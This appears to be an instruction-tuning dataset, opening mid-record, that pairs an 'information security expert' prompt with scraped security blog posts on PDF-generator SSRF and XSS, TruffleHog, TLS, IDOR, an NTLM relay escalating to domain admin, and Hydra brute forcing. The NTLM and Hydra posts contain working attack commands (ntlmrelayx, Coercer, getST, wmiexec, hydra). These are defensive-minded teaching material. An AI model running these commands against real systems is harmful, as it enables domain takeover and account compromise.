HTML is rendered you'll get a visual cue in the PDF that your HTML was rendered Congratulations Big HeaderSmall Header Wrapped with apostrophes inside an HTML entity attribute Congratulations Big ApostropheLittle Apostrophe Wrapped with quotation marks inside an HTML entity attribute Congratulations Big Quotation MarkLittle Quotation Mark Pitfall Atari 2600 1982 WARNING When checking for the last context quotation marks be mindful of your request type JSON is a very common request format that you'll come across Don't forget to escape the quotation marks It's important to figure out which context your payload is landing in because if there's a syntax error you might see an error message or you might not see anything at all Can I access remote servers As mentioned before try pasting a URL into the payload position that you're investigating If it fetches the remote resource or interacts with your Bup Collaborator then you know that the server you're testing can access remote servers If you determined that your payload is landing in between two HTML tags though try something like the following Congratulations I'd also like to highlight a feature that you might not expect to be vulnerable to SSRF Digital signatures are an unexpected place for SSRF but keep an eye out for requests that include something like this data image png base64 BASE64_ENCODED_BLOB That's the start of a data URL2 which is a way that an application can embed images inline as opposed to fetching them from a remote server Here's what a vulnerable server is likely expecting Proof that you Signed Your Life Away data image png base64 BASE64_ENCODED_DIGITAL_SIGNATURE Since the data URL is just a source for an image element try replacing the data URL with a URL that points to a remote resource Can I execute JavaScript At this point you've figured out where your payload is landing and verified that the server can pull down remote resources Next you could check for JavaScript execution My go-to method is to use something like this Proof that you Signed Your Life Away If you see the BHIS logo3 in the rendered PDF then you know that the JavaScript executed Now something to keep in mind As when testing for XSS there's a chance that injecting a"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Rooting For Secrets with TruffleHog</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Thu, 18 Jan 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "The potential leaking of confidential information can pose a significant security risk for any organization When sensitive details i.e API keys passwords cryptographic keys and other credentials are unintentionally committed to version control systems like Git they could lead to a compromise of systems data or other resources Leaking secrets can have severe repercussions for an organization compromising data integrity confidentiality and system security Exposed tokens can provide unauthorized access to sensitive information enabling malicious actors to manipulate or steal data disrupt services and potentially escalate their attacks Additionally exploited tokens could also be leveraged to conduct sophisticated phishing campaigns or launch further cyberattacks The impact of this lapse in security could manifest as financial losses reputational damage and legal consequences So how do you know if you have buried secrets hiding in the vast digital landscape of your organization Easy You employ a truffle hog TruffleHog TruffleHog1 is a free security tool designed to root around for sensitive information exposure within version control systems CI cloud assets and file systems Specifically it helps identify and mitigate security risks related to the inadvertent storage of credentials secrets and other sensitive data For example TruffleHog could scan a Git code repository for patterns that resemble known sensitive information helping the organization and developers proactively identify and remove such data before it becomes a security vulnerability Identifying and cleaning up leaked secrets before an attacker can find them is a crucial component to security Installation Installing TruffleHog is easy using APT by executing the command below sudo apt install trufflehog APT not your thing Don't worry The tool supports several other methods for installation Using brew on MacOS Docker Binary releases via ithub.com trufflesecurity trufflehog releases Git clone and compile from source Using the install.sh script on GitHub also supports specific version installation Exact steps for these alternative installation methods can be found at ithub.com trufflesecurity trufflehog floppy_disk-installation Sub-Commands Once installed it's time to familiarize yourself with the nine available sub-commands that TruffleHog uses to root around for secrets These can be listed by using the --help flag from the command line as shown below trufflehog --help TruffleHog Sub-Commands Each of the commands above has specific subsequent flags that can be set when executing TruffleHog These additional flags help to both extend functionality and narrow the tool's scope These flags can be listed by including the --help flag after any of the above sub-commands as shown below Optional Flags Snippet There are some flags that are available across every sub-command The --json flag for example outputs the tool's results in JSON format Sample JSON Output This could then be consumed and parsed by a custom script to convert any findings into even more actionable intelligence Given the sample TruffleHog JSON output above let's say you want to extract information about each detected issue specifically the commit file email repository and the detected AWS keys You can use jq to accomplish this The jq command-line tool is a powerful and lightweight way to process and manipulate JSON data It provides a convenient and efficient way to extract transform and filter JSON content making it a valuable tool for working with JSON-based APIs configuration files and data processing Some of jq's useful features are Querying and Selecting Data Filtering and Transformation Prettifying Output Conditional Processing Combining with Other Unix Tools i.e cat grep sed Scripting Support The command below takes our TruffleHog JSON output and extracts commit file email repository and the detected AWS keys to display in a shortened JSON format cat trufflehog_output.json jq -c '.SourceMetadata.Data.Git as git commit git.commit file git.file email git.email repository git.repository awsKey .Raw jq Parsing Another shared sub-command flag is --only-verified which directs TruffleHog to check every potential credential that is detected against the API that it thinks it belongs to This additional step can help eliminate false positives For example the AWS credential detector performs a GetCallerIdentity API call against the AWS API to verify if an AWS credential is active Sample Verified Key Other flags are sub-command specific like --since-commit and --max-depth which are available in the git command and control how far back and to what depth into commits the scan focuses on These are useful to narrow the scope of the scan and incorporate it into your CI process to identify problems before they reach a distributed repository Now that we know what TruffleHog is why it's important and understand the basics of how it works let's look at some real examples Web Application err Application TruffleHog has been so successful in reviewing repositories filesystems cloud assets and CI implementations that it has also been adapted by third parties into browser extensions Chrome2 and Firefox3 to scan web application code returned by a server for secrets too For example the image below shows a React application that graciously returned numerous secrets for a company's CI CD pipeline within the main.js file Including GitHub Bamboo Polaris AWS and SonarQube secrets API keys for CI CD pipeline This issue is made worse by the file not requiring authentication to get meaning anyone online could retrieve these keys With a little extra legwork and the help of GitHub's API an attacker would discover the GitHub token allowed for full read-write to the organization's private GitHub This could also permit user information for who issued the token the organization's larger list of users and repository enumeration GitHub Token Authorization Sample The leaked AWS keys were also valid and could be abused using AWS's own cli tool4 My Code Has Secrets What Now BHIS recommends taking the following steps when you encounter secrets in your or your customer's code Remove all secrets Remove the previous commit s in the repository's history that contained the secret Periodically run open-source token scanning software such as TruffleHog Review the CI CD configurations What Next If you're interested in learning more advanced usage of TruffleHog you can start by checking out their guide on GitHub ithub.com trufflesecurity trufflehog advanced-usage References Enjoyed this blog Want to learn more Chris will be presenting live online training during The Most Offensive Con That Ever Offensived Find more details here Advanced Offensive Tooling"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Testing TLS and Certificates</title>\n<taxonomies>Brian King, InfoSec 201, LLMNR, Web App, encryption, SSL, TLS</taxonomies>\n<creation_date>Thu, 25 Jan 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Pentest reports sometimes include bad information under a heading like Weak TLS Configuration or Insecure SSL Certificates This article will explain how TLS is supposed to work common ways it goes wrong and a few pitfalls to avoid when testing First there are two separate things at play here the certificate is one the cryptography for the TLS connection is another Your first thought about certificates and HTTPS may be Oh that's what keeps my information private It encrypts the data as it goes across networks so that only the server and I can decrypt it but that's not quite right The certificate's primary job is to let you verify who you're talking to The encryption only happens after that's done It does little good to encrypt your conversation if you don't know who you are talking to What a Certificate Does The certificate on a TLS server is an X.509 certificate We sometimes call them SSL Certificates or TLS Certificates There's nothing wrong with that but it's good to know their actual name too A certificate's purpose is to give a client confidence that the server is who it claims to be before starting a conversation A certificate for a domain is like a passport for a citizen it's a thing you get possession of that allows someone to validate your identity based on the assertions of a trusted third party With a passport that third party is a government If you have decided to trust a country's passport issuing system and I show you a valid passport from that country with the name George Washington on it and if you believe the person in the photo on that passport is me then your trust in that government's process for issuing passports and the fact that the passport is not in your judgement forged or altered means that you must believe that's my name With a certificate the third party is a certificate authority CA If a website shows you a valid certificate with its domain name on it and that certificate is signed by a CA you trust then your trust in that CA means that you must believe that the server is who it claims to be Wrinkle It's your browser or web client or OS vendor that decides which CAs to trust You don't really get to pick When you test a certificate you are testing it for validity making sure the signature is valid and that the root certificate that signed it is one that you trust Anyone can make a forged certificate that claims to be valid for any given domain name just as anyone can make a forged ID card The value in both the passport and the certificate is in the ability to detect a forged or invalid item by verifying the claim with a trusted third party Details Certificate Validation Before issuing a certificate for a given domain a reputable certificate authority will require the requestor to prove that they control that domain That is the one job of a certificate authority their signature on a certificate is their statement that whoever controls the domain named in the certificate also controls the private key for the certificate and by implication is the only one who can use the certificate to establish a TLS connection The certificate authority is saying this If you get a certificate signed by us when you visit a server by its fully qualified domain name and if you verify that the signature on the certificate was created with our root certificate which is pre-installed with your client then you can have great confidence that the owner of the domain is in control of the server that the certificate came from That is you're talking to who you think you're talking to Proving control of a domain to a certificate authority is often done by adding a DNS TXT record with content specified by the CA but the CA can come up with their own requirements The certificate validates ownership of a domain name If you try to validate a certificate when you've connected to its server by IP address that validation will ALWAYS fail Certificates validate ownership of domain names If there's no domain name there's no claim to confirm Aside It is possible to include an IP address in a certificate as a Subject Alternative Name and then it would validate But in practice nobody does this No server operator wants to be tied to a single IP address And no client connects to a web server by its IP address anyhow Except you of course You do that sometimes But you also know how to use curl And you know what the -k switch does You're slightly atypical there Play along Qualys SSL Server Test Knows Don't Test TLS by IP Address see red text Good Trust Rating Testing by FQDN Same Site Tested by IP certificate does not match supplied URI It's common to see a site's certificate signed by one or more intermediate certificates and not directly by the root certificate This results in a certificate chain where each certificate is signed by one higher up on the chain until you get to the root certificate The server you're talking to should include every certificate in that chain except for the root certificate It is an error to omit intermediate certificates but your client often knows where to find them and will do so It is also an error to include the root certificate and but any sane client will just mutter nice try ignore it and use what's in its local certificate store anyhow This chain approach makes it easier to protect the root certificate's private key by keeping it offline nearly all the time and signing new certificates with an intermediate certificate that is signed by the root instead This way if an intermediate certificate is compromised the CA can revoke it and issue a new one signed by the same root certificate and not have to immediately distribute a new root certificate to every web client in the world They can also use different intermediate certificates for different purposes or cycle through intermediate certificates on a schedule for the same reasons organizations change passwords now and then As in programming a little indirection adds flexibility Trusting a Certificate or Not There are only two reasons not to trust a certificate When it is expired or not yet valid based on its own from and to dates and When the signature on the certificate cannot be independently verified There are two ways this can happen The certificate is self-signed so there is no third-party to consult about its validity The certificate is not self-signed but the signing certificate is neither in the client's trusted certificate store nor signed by one that is A certificate that is self-signed cannot be independently validated That makes it untrusted by default Some clients allow a user to trust this certificate from this server in the future in the same kind of trust on first use approach that SSH takes and so they are not always bad Just nearly always An organization can create its own root signing certificate That certificate would be installed on all of the organization's devices as a custom certificate similar to how a tester imports the certificate from Burp Suite or ZAP into the browser they use for testing The organization could then use this certificate to sign certificates for sites intended to be used only from corporate-owned devices Corporate devices would be able to validate the signature and connect Other systems would not be able to validate the signature and will throw an error If you see an untrusted certificate error that probably means it's not self-signed or the error would have said self-signed instead but one of the following is true The client you're using doesn't have the signing certificate and so cannot verify the signature You do have the signing certificate but the signature on the certificate failed validation i.e the certificate is forged The certificate is expired or not yet valid Oddly perhaps every root signing certificate we trust is self-signed But the signing chain has to end somewhere and these root certificates are widely distributed via controlled methods into secure storage locations It's from that delivery process that we derive trust in the root certificates This means that if an attacker can get their own self-signed certificate into your client's certificate store as a trusted root certificate that attacker can make certificates for any domain and your client will trust them It's important to protect that certificate store Details Cryptography The certificate has almost nothing to do with the encryption used in the TLS conversation It facilitates the sharing of key material between the client and the server but it has nothing to say about which algorithms key exchange methods or key lengths may be used The certificate's primary job is to allow you to confirm that you're talking to who you think you're talking to TLS uses the asymmetric keys a public key and a private key associated with the certificate to exchange a unique symmetric key for each TLS connection That symmetric key is what is used to encrypt the data sent over the TLS connection Once you've established that the server is who it claims to be only then are you able to keep your data private by encrypting it with a key known only to you and the server The network traffic looks something like this Client sends a client hello message to start the connection This includes random bytes called client random for later use along with the version of TLS it wants to use and a list of cipher suites it supports Server responds with a server hello that includes the server certificate and sometimes an intermediate certificate or two the cipher suite the server chose from the list the client gave and a string of random bytes called server random for later use Client verifies the signature on the server certificate using a root certificate it already has in its store of trusted certificates If this fails the connection stops Client uses the public key in the certificate it got from the server to encrypt another string of random bytes called the premaster secret and sends the ciphertext to the server Server uses private key to decrypt those random bytes Client and server separately generate the same session key based on the client random the server random and the premaster secret Session key is used to encrypt all future data in this connection Key Takeaways That was a lot of words to explain why we focus on just a few things when testing TLS certificates Those things are Testing a server's TLS configuration by using its IP address will ALWAYS result in trust failures and probably other misinformation too Self-signed certificates cannot be independently validated or trusted A certificate that you cannot validate is not necessarily one that cannot be validated Corporate certificate authorities are real and need to be taken into account The encryption algorithms supported by a server are not determined by the certificate the server uses"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypass NTLM Message Integrity Check - Drop the MIC</title>\n<taxonomies>Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, LLMNR, Red Team</taxonomies>\n<creation_date>Thu, 01 Feb 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "In An SMB Relay Race How To Exploit LLMNR and SMB Message Signing for Fun and Profit Jordan Drysdale1 shared the dangers of lack of SMB Signing requirements and demonstrated an attack path which can allow an attacker to escalate from zero to Domain Admin DA in an Active Directory environment In this article we will build off the SMB relay techniques discussed in that blog post and demonstrate an SMB to LDAP S relay attack Background Machine Account Quota The domain attribute used to determine how many computers a user can join to the domain is called ms-ds-machineaccountquota.2 By default any authenticated domain user can join up to 10 computers to an Active Directory domain Joining a computer to the domain creates a domain object computer object PowerShell Get Machine Account Quota This configuration can be dangerous Joining a computer to the domain should require approval from an administrator and an organization should have processes in place to ensure that domain computers have the standard security configurations group policies endpoint protection applied Additionally the process should update the organization's device inventory Message Integrity Imagine we have gained a foothold in the target organization Foobar's environment LDAP is only available on domain controllers Therefore we must target a domain controller in an LDAP relay attack We have performed some basic reconnaissance and located the target domain controller DC01.foobar.com 10.10.10.1 We can set up an LDAP relay targeting the discovered domain controller using the following Impacket3 ntlmrelayx.py arguments -t Target to relay the credentials to -wh Enable serving a WPAD file for Proxy Authentication attack setting the proxy host --add-computer create domain computer object -smb2support SMB version 2 support The full command ntlmrelayx.py -t ldaps 10.10.10.1 -wh bhispad foobar.com -smb2support As demonstrated in the figure below we received a connection via SMB However attempting to relay SMB to LDAP resulted in the following error The client requested signing Relaying to LDAP will not work This usually happens when relaying from SMB to LDAP SMB to LDAP Connection Failed This behavior is expected Typically SMB traffic cannot be relayed to LDAP S NTLM authentication consists of three message types NTLM_NEGOTIATE NTLM_CHALLENGE and NTLM_AUTHENTICATE A field known as the Message Integrity Code was added to the NTLM_AUTHENTICATE message to prevent message tampering A vulnerability was published in 2019 revealing a flaw that allowed an attacker to bypass the NTLM Message Integrity Check MIC .4 This issue is known as the drop the MIC vulnerability and allows an attacker machine-in-the-middle position to tamper with the NTLM authentication by removing the integrity check When MIC is not included the connection from SMB can be relayed to LDAPS Exploiting CVE-2019-1040 Once again let's imagine we have gained a foothold in the target organization Foobar's environment At this point we have network level access and we located the target domain controller DC01.foobar.com 10.10.10.1 To provide a brief initial attack summary Configure NTLMRelayx to relay NTLM authentication to the target the domain controller and remove message integrity Configure Responder poisoner with SMB and HTTP servers disabled Wait for incoming credentials We can exploit systems vulnerable to CVE-2019-10405 and relay SMB connections to LDAPS by adding the --remove-mic flag to our Impacket command Assuming the target domain has the default machine account quota or a policy greater than zero we can use the --add-computer flag to create a computer object If the attack is successful a computer object with the name snowmachine2 would be added to the target domain The full command is shown below ntlmrelayx.py -t ldaps 10.10.10.1 -wh bhispad foobar.com --add-computer 'snowmachine2 --remove-mic -smb2support Next we will configure Responder to poison LLMNR and NetBIOS traffic and automatically pass the NTLM authentication to our Impacket relay by turning the SMB and HTTP servers off To turn off the Responder servers we must edit the Responder.conf file Responder Configuration As shown in the figure below the relay attack was successful Credentials for a low privileged user account named FOOBAR bspears were relayed over LDAPS to create the computer object snowmachine2 Create Domain Computer Object We have effectively escalated from network access to domain account access We can test our computer account credentials using CrackMapExec6 and query the ms-ds-machineaccountquota crackmapexec ldap DC01.foobar.com -u snowmachine2 -p REDACTED -M MAQ Authenticate as Snowmachine2 and Get MAQ We can use these domain credentials to enumerate domain information and explore paths of privilege escalation Domain Takeover If we have two domain controllers and at least one domain controller can be coerced to authenticate to our attacker machine we can expand upon this attack by relaying credentials from one domain controller to another and creating a computer object with delegation rights to a domain controller Scenario Details Domain Controller 1 DC01.foobar.com 10.10.10.1 Domain Controller 2 DC02.foobar.com 10.10.10.22 Attacker Machine 10.10.10.200 Owned User snowmachine2 can use any domain user account Known Domain Administrator Account DA_Dan We can elevate privileges from a standard domain computer account snowmachine2 to a domain administrator account by following the procedure outlined below Coerce domain controller DC02 10.10.10.22 to authenticate to our attacker machine Relay the hash obtained from the domain controller to LDAPS on target domain controller DC01 10.10.10.1 and create another domain object with delegation rights to DC02 Use the new computer object to request a service ticket on behalf of the domain administrator DA_Dan to impersonate the domain administrator By adding the --delegate-access flag to our ntlmrelayx.py command we can tell ntlmrelayx to create a computer object with delegation access to the relayed account ntlmrelayx.py -t ldaps DC01.foobar.com -wh bhispad --add-computer 'DcMachine --delegate-access --remove-mic -smb2support Coercer7 is a python tool used to coerce Windows machines to authenticate to an attacker machine by abusing various vulnerable RPC functions Using the domain credentials obtained from our new computer account snowmachine2 we can use Coercer to force the victim machine DC02 to authenticate to the attacker host 10.10.10.200 Side Note In some cases a relay attack may not require domain credentials For example if the victim host is not patched against CVE-2021-36942.8 The Coercer arguments required are as follows -u Domain Username -p Password for User -d Target Domain -l Listener IP Our Relay -t Target The complete Coercer command is shown below coercer coerce -u snowmachine2 -p REDACTED -d foobar.com -l 10.10.10.200 -t DC02.foobar.com The Coercer response shown below ERROR_BAD_NETPATH indicated that the coercion was successful Coerce Domain Controller DC02 As shown in the figure below we successfully created a computer object with Delegation Rights to DC02 Create Domain Computer Our new computer account DcMachine was created with privileges that allow the account to impersonate any user on the domain controller DC02 essentially any domain account including a Domain Admin Let's demonstrate this by impersonating the domain admin DA_Dan To impersonate the domain admin we will use Impacket's getST module to request a Kerberos ticket on behalf of DA_Dan getST.py -spn 'cifs DC02.foobar.come 'foobar.com DcMachine -impersonate 'DA_Dan -dc-ip 10.10.10.1 export KRB5CCNAME DA_Dan.ccache Get Service Ticket for DA_Dan Using the Kerberos authentication we can establish an interactive shell on DC02 impersonating the domain admin DA_Dan wmiexec.py -k -no-pass FOOBAR.COM 'DA_Dan DC02.foobar.com Impersonate Domain Administrator DA_Dan Domain Administrator DA_Dan To summarize we successfully escalate privileges from network access to domain administrator via two relay attacks Each attack relayed an incoming SMB connection to an LDAPS connection which was possible because the target systems were not patched against CVE-2019-1040 The first attack allowed us to gain our initial set of domain account credentials by relaying SMB connections to LDAPS Next we elevated privileges from a standard domain computer account to a domain administrator account via a second relay attack which involved coercing a domain controller to authenticate to our attacker machine and creating another computer object with delegation rights to the domain controller So How Do We Prevent Detect Such Attacks Weak Active Directory Object Creation Configure notifications to key personnel when new domain objects are added Ensure all newly added computer objects are placed in the proper OU and appropriate Group Policies are applied Update the organization's authorized device inventory when a new computer joined the domain Review the MS-DS-MachineAccountQuota attribute and disallow non-administrative computer joins to the domain Network Poisoning and Relay Attacks Enable SMB Signing on all systems Disable LLMNR on all clients via Group Policy Object GPO Disable NetBIOS Name Server NBNS Disable the Proxy Auto detection via Group Policy Disable NTLM Ensure all systems are patched against CVE-2019-1040 Implement detections for malicious RPC calls and consider implementing RPCFirewall Additional Resources ww.blackhillsinfosec.com mitm6-strikes-again-the-dark-side-of-ipv6 ww.blackhillsinfosec.com an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit ww.antisyphontraining.com event hacking-active-directory-fundamentals-and-techniques ww.blackhillsinfosec.com impacket-offense-basics-with-an-azure-lab ww.blackhillsinfosec.com impacket-defense-basics-with-an-azure-lab eronetworks.com blog stopping-lateral-movement-via-the-rpc-firewall upport.microsoft.com en-us topic kb4034879-use-the-ldapenforcechannelbinding-registry-entry-to-make-ldap-authentication-over-ssl-tls-more-secure-e9ecfa27-5e57-8519-6ba3-d2c06b21812e ithub.com zeronetworks rpcfirewall earn.microsoft.com en-us windows win32 adschema a-ms-ds-machineaccountquota earn.microsoft.com en-us windows win32 adschema a-msds-allowedtoactonbehalfofotheridentity ww.bleepingcomputer.com news security microsoft-ntlm-flaws-expose-all-windows-machines-to-rce-attacks src.microsoft.com update-guide en-US advisory CVE-2019-1040 ecurityboulevard.com 2019 06 drop-the-mic-cve-2019-1040 ww.rapid7.com db vulnerabilities msft-cve-2019-1040 References"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Revisiting Insecure Direct Object Reference (IDOR)</title>\n<taxonomies>External/Internal, Finding, General InfoSec Tips & Tricks, How-To, Melissa Bruno, Web App, IDOR, Insecure Direct Object Reference</taxonomies>\n<creation_date>Thu, 08 Feb 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "The new year has begun and as a penetration tester at Black Hills Information Security one thing really struck me as I reflected on 2023 a concerningly large number of web applications suffered from insecure direct object reference IDOR vulnerabilities that were critical in severity because they exposed highly sensitive data In the last four months of 2023 alone I discovered five such instances This issue is slipping through the cracks with alarming frequency even in web applications that are otherwise fairly well-secured Those of you who are unfamiliar with IDOR should consider checking out Kelsey Bellew's blog post from February 2016 HERE for a great high-level overview I will also be covering the basics of IDOR here as well as additional tips for preventing and detecting it In essence IDOR is when an authenticated user of a web application is able to gain unauthorized access to resources by changing the value of an identifier in an HTTP request There are a number of spots in the HTTP request where these identifiers may be such as a URL query strings HTTP POST parameters or even in cookie values If the web application makes an HTTP POST request to retrieve the name email address and phone number of the current user with an ID of 10001 and changing the ID in the request to 10009 returns the name email address and phone number of an entirely unrelated user then IDOR has been successfully exploited This is a consequence of the application failing to check whether a user is authorized to access a particular set of information while carrying out a request Below is a step-by-step example of IDOR exploitation First the user Sideshow Bob accesses his own data through normal means at the URL user 10001.json Authorized Access to User Data The HTTP request that returned the above data is intercepted with Burp Suite and sent to the Burp Suite Intruder module The number 1 in the URI user 10001.json is specified as a payload position Burp Suite Intruder Payload Position Configuration Next the Burp Suite Intruder is configured to inject the numbers 0 through 9 into the payload position Burp Suite Intruder Payload Set Configuration The resulting Burp Suite Intruder output returns not just Sideshow Bob's data but also Bart Simpson's data at user 10009.json which Sideshow Bob was not intended to view Burp Suite Intruder Results Unauthorized Access to Another User's Data The fact that IDOR by definition can only be performed post-authentication may give some developers a false sense of security regarding this issue However if the vulnerable web application has a registration page allowing anyone to make a new user account the information is as good as public because anyone on the internet could make an account and access that data Even if account registration is restricted the potential for damage is so substantial that the risk from IDOR attacks should not be taken lightly Because unsecured identifiers may be used while the application carries out a variety of actions the consequences of IDOR can be wide-ranging Examples of IDOR attacks that I have successfully exploited over just the past few months include IDOR affecting password change functionality which made it possible to change the password of any user in the application IDOR that allowed low-privilege users to perform admin functions such as user impersonation password changes and modification or deletion of user accounts IDOR that disclosed large amounts of personal information about every user in the system including full names mailing addresses email addresses phone numbers and other sensitive data This information can be very damaging to a company's reputation if it winds up in a data dump on the dark web Preventing and addressing IDOR requires both developers and penetration testers to be proactive with the steps I've outlined below Tips for Testers Discovering IDOR Examine HTTP requests while you are exploring the application and test for IDOR using the Burp Suite Intruder as described earlier in this blog post Care needs to be taken when performing these tests in production but whenever possible it is prudent to inject hundreds or thousands of numbers as payloads as numeric identifiers are not always sequential and a large number of guesses may be necessary to successfully identify IDOR Know what information in the environment is considered sensitive Sometimes it is obvious which data is sensitive but sometimes it's not Work with the stakeholders to understand which data they are most concerned about Once you have identified which data is most sensitive identify which endpoints return this data and prioritize testing those especially if there is a limit to how much time you can spend testing an application Be extremely thorough Even if access controls are enforced correctly in 99 out of 100 endpoints that one unenforced endpoint can expose a lot of information Whenever possible perform testing with two user accounts per privilege level If there are so many user account privilege levels that this would be impractical aim to test with user accounts that have the least level of privilege and the highest level of privilege at a minimum Be wary of false alarms Authenticated users are often intended to access certain personally identifiable information in certain contexts For example an application accessible only to company employees may have a company directory with employees contact information so that coworkers can get in touch with one another Business addresses and business phone numbers for sales representatives may be appropriate to reveal even without authentication whereas the same individuals home addresses may not be appropriate to reveal even to authenticated users Context is key The Burp Suite extension Autorize is helpful for automating access control checks particularly when the tester has access to multiple user accounts Tips for Developers Preventing IDOR Every time a user accesses a resource or performs an action a check needs to be performed to verify that the user is authorized to access that resource or perform that action IDOR needs to be considered every time new code is deployed Most of the time when I discover IDOR access controls are enforced correctly 99 percent of the time but one or two endpoints slip past any previously utilized quality checks and wreak havoc Keep in mind that IDOR is a business logic flaw Vulnerability scanners may be great at detecting things like cross-site scripting but they aren't going to pick up on nuanced logic such as Customer A should have access to Customer B's data but not Customer C's data Using unpredictable identifiers such as GUIDs may make IDOR more difficult to discover but it is not a replacement for correctly enforcing security controls If the GUIDs are disclosed anywhere in the application or sent over a URL IDOR may still be exploited Consider adding checks for IDOR as integration tests or acceptance tests as described here Hopefully this post has given you some things to think about regarding IDOR Given how prolific and consequential this vulnerability is we all need to do our part to keep an eye out for it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hacking with Hydra</title>\n<taxonomies>External/Internal, Informational, InfoSec 101, John Malone, Password Spray, Red Team</taxonomies>\n<creation_date>Thu, 15 Feb 2024 17:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "What is Hydra Hydra is a tool that can be used for password spraying Let's begin by defining the term password spray A password spray is where an attacker defines one password such as Winter2024 and tries it against a list of obtained usernames If one of these accounts uses Winter2024 as a password then the attacker may be able to access that resource Password spraying and brute force attacks are commonly used by attackers who wish to access resources that are exposed on the internet or on internal networks A good password spray will use passwords that are commonly used or that encompass traits that concern the organization or resource that you are attacking Moving forward in this article we will explore applicable situations for performing a brute force attack and password sprays with Hydra As always make sure you have proper permission before performing password attacks against targets that you do not own Performing a Brute Force Attack AI-generated image For this step we are going to look at performing a password spray against a vulnerable web application that is hosted on Try Hack Me known as Mr Robot CTF which has a theme related to the TV show of the same name While this will not serve as a full CTF walkthrough the concept used here is sufficient enough to demonstrate a brute force attack in action and how it would work in a real-life setting During this exercise the tester is required to perform a password-based attack to gain access In the below screenshot we can observe that we have arrived at a WordPress login portal Seeing how this is a website we can use Hydra to password spray with HTTP POST requests WordPress Login Portal To capture the request we can simply open our browser's developer console and then issue a simple username and password request such as admin admin into the login form in the browser Upon submitting we are informed that our username is invalid Additionally our developer console can now be used to view the POST request along with the payload that was used to make it The keen eye may also observe that the username is verbose in nature which can allow us to make the assumption that username enumeration may be possible Invalid Username Error Seeing how this is a Mr Robot themed CTF box we can test this by trying a variety of names from the Mr Robot TV show angela darlene elliot irving joanna robot trenton tyrell whiterose After submitting the credentials our developer console now contains the following payload which contains the log and pwd parameters that display our entered credentials log admin pwd admin wp-submit Log In redirect_to http 3A 2F 2F10.10.192.106 2Fwp-admin 2F testcookie 1 Developer Console Contains Request Payload This payload can be inserted into a command with the following changes to instruct Hydra to perform username enumeration The below command uses Hydra's -L flag to specify our list of users -p to use a chosen password and the http-post-form switch to instruct Hydra to use our captured HTTP POST request It should be noted that the http-post-form switch contains a value that is made up of the target page for spraying which is necessary to complete our request the request itself which consists of the payload from our developer console the error message that presents This instructs Hydra to look for results that do not contain the Invalid Username error hydra -L users.txt -p admin 10.10.192.106 http-post-form wp-login.php log USER pwd PASS wp-submit Log In redirect_to http 3A 2F 2F10.10.192.106 2Fwp-admin 2F testcookie 1 Invalid Username This returns feedback from Hydra that shows that elliot returned an error that did not match Invalid Username However Hydra will claim that we have a match for the password This is not true however We are likely receiving a different error than Invalid Username We can visit the browser and try this manually to verify our findings Hydra Enumerates the elliot Username as Valid Entering elliot into our browser reveals another verbose error but this time it is a different one that concerns password validity Verbose Password Error Now that we know that elliot is a valid user we can perform a brute force attack against the account This is done by substituting some switches in our below Hydra command Notably the -l switch is used to specify a user and -P is used to specify our file containing passwords Additionally our error message is being changed to look for a response that does not contain the above error Seeing how a true password match will fail to return an error at all we can assume that this time we will not be receiving a false positive when a match is discovered hydra -l elliot -P passwords.txt 10.10.192.106 http-post-form wp-login.php log USER pwd PASS wp-submit Log In redirect_to http 3A 2F 2F10.10.192.106 2Fwp-admin 2F testcookie 1 The password you entered for the username Upon running this command we observe that the username elliot is tested repeatedly against a variety of passwords A positive hit is identified for ER28-0652 Hydra Brute Forces the Password for elliot Returning to our login page and entering the password results in us being taken into the webserver's administrative console From here we could examine the version of WordPress and look for vulnerabilities that could allow us to obtain a shell on the system This is outside the scope of this article though so 